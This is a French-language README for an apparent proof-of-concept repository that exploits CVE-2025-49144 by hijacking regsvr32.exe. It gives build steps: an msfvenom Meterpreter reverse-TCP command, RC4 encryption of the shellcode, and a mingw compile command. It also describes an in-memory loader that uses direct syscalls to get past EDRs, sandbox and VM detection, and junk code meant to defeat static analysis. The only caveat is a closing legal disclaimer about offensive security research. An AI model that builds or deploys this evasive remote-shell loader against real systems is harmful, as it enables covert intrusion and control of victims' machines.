# 🔓 CVE-2025-49144

Ce projet illustre un PoC exploitant la vulnérabilité **CVE-2025-49144**, en détournant l’appel à `regsvr32.exe` (LOLBIN hijacking) pour exécuter du shellcode chiffré en **RC4**, injecté en mémoire via des **appels système directs** grâce à [SysWhispers3](https://github.com/klezVirus/SysWhispers3).  
Le shellcode utilisé est typiquement un **Meterpreter** généré via `msfvenom`.

---

## 💡 Fonctionnalités

* Chiffrement RC4 du shellcode avec clé en dur
* Détection sandbox / VM optionnelle
* Appels système directs : `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtTerminateProcess`
* Exécution payload **in-memory** (aucune écriture sur disque)

---

## ⚙️ Étapes de génération

### 1. Générer le shellcode avec msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXX -f c -o shellcode.txt
```

---

### 2. Formater le shellcode pour Python

```bash
python3 format_shellcode_txt.py
```

Ce script :
- Lit le contenu du fichier `shellcode.txt`
- Extrait et nettoie le shellcode brut
- Affiche un formatage compatible Python (`b"\xfc\x..."`)
- 📌 **Copier** la sortie dans la variable `shellcode = (...)` du fichier `rc4_shellcode.py`

---

### 3. Chiffrer le shellcode et générer un header C

```bash
python3 rc4_shellcode.py
```

Cela va :
- Chiffrer le shellcode avec RC4 (clé définie dans le script)
- Génére un fichier `encrypted_payload.h` contenant :
  ```c
  unsigned char payload[] = { 0xAA, 0xBB, ... };
  unsigned int payload_len = ...;
  ```

---

### 4. Compiler le chargeur

```bash
x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o "C:\DEV\regsvr32.exe" -mwindows -s -O2
```

---

## 📂 Fichiers

### `format_shellcode_txt.py`

Convertit un shellcode brut C (`shellcode.txt`) en format `bytes` Python pour intégration dans `rc4_shellcode.py`.

---

### `rc4_shellcode.py`

- Contient une **clé RC4 en dur** (`b"hola"`)
- Chiffre le shellcode
- Génére un header C (`encrypted_payload.h`) contenant le payload chiffré

---

### `loader.c`

Le loader principal qui :
- Inclut le shellcode chiffré depuis `encrypted_payload.h`
- Le déchiffre en mémoire avec `rc4()`
- Alloue, copie, rend exécutable puis exécute le shellcode via **SysWhispers3**
- Simule l’appel à `regsvr32.exe` réel pour camoufler l'exécution
- Intègre une détection sandbox optionnelle et du code "junk"

---

### `syscalls.c/.h/.obj`

Générés avec [SysWhispers3](https://github.com/klezVirus/SysWhispers3). Contiennent les wrappers nécessaires aux syscalls directs, pour contourner certains EDRs.

---

## 🔍 Détails du Code

### RC4 (chiffrement/déchiffrement)

```c
void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen) { ... }
```

Fonction utilisée côté Python (chiffrement) et côté C (déchiffrement en mémoire).

---

### Fonction `junk`

```c
void junk() {
    int a = rand() % 123;
    if (a == 42) MessageBoxA(NULL, "Noise", "Filler", MB_OK);
}
```

Ajoute du bruit au binaire final pour modifier l’empreinte (hash) et perturber l’analyse statique.

---

### Détection sandbox

```c
BOOL is_sandbox_environment() { ... }
```

Détecte :
- < 2 Go RAM
- < 2 CPU
- Temps d’inactivité > 5min
- Uptime < 30 sec
- Présence de strings VMware, VBox, QEMU dans le BIOS

---

### Exécution via Syscalls

```c
Sw3NtAllocateVirtualMemory(...)
memcpy(...)
rc4(...)
Sw3NtProtectVirtualMemory(...)
((void(*)())baseAddr)();
```

Utilise les appels noyau pour éviter `VirtualAlloc`, `VirtualProtect`, etc.

---

### Exécution de regsvr32.exe

```c
GetSystemDirectoryA(sysPath, MAX_PATH);
strcat(sysPath, "\\regsvr32.exe");
CreateProcessA(...);
```

Lance la vraie version de `regsvr32.exe` pour potentiellement brouiller l’analyse comportementale.


## 🧷 Notes complémentaires

* Pense à regénérer `encrypted_payload.h` à chaque nouveau shellcode
---

## ⚠️ Avertissement légal

> 🔬 Ce projet est fourni uniquement à des fins pédagogiques et de **recherche en sécurité offensive**.  
> 🛑 L’auteur décline toute responsabilité en cas d’usage malveillant.
